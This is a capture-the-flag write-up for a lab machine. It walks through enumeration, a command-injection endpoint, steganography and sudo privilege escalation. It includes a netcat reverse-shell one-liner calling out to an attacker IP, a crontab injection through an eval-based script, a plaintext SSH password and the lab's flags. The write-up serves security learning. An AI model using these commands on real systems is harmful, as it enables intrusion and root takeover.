### Ports
21 
80

-> Nothing Intresting

### DirEnum

-> /assets/index.php   _it grabbed my attention_

-> /assets/index.php?cmd=<command/>
_or_
/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir

this endpoint i found using dirsearch 

location : _/usr/lib/python3/dist-packages/dirsearch/db/dicc.txt_

### Initial Access

payload used : `busybox nc 10.17.127.143 9001 -e sh`

url :  _/assets/index.php?cmd=_`busybox nc 10.17.127.143 9001 -e sh`

got reverse shell  : www-data

### www-data -- deku User

1. Found a  : _/var/www/html/assets/images/oneforall.jpg_
2. transferred to attacker machine , analyzed and see it wasn't a jpg file 
3. used magicbytes tool to fix it's magic byte to make it a .jpg file
	1. github : https://github.com/Haxrein/MagicBytes
	2. `python3 magicbytes.py -i $dir/oneforall.jpg -m jpg`
4. jpg file was corrected and got the actual image

### Steganography

1. `steghide extract -sf <filename>`
2. passphrase was found : _/var/www/Hidden-content/passphrase.txt_
3. found the ssh creds for user _deku_
4. **deku**:**One?For?All_!!one1/A**

### Deku - Root

1. sudo -l 
```
User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

2. feedbask.sh was using eval function 
3. `sudo ./feedback.sh`
4. entered : "* * * * * root cat /root/root.txt > /tmp/flag.txt" > /etc/crontab
5. this job was appended to /etc/crontab
6. & got root.txt in /tmp/flag.txt

## Flags

USER : THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
ROOT : THM{Y0U_4r3_7h3_NUm83r_1_H3r0}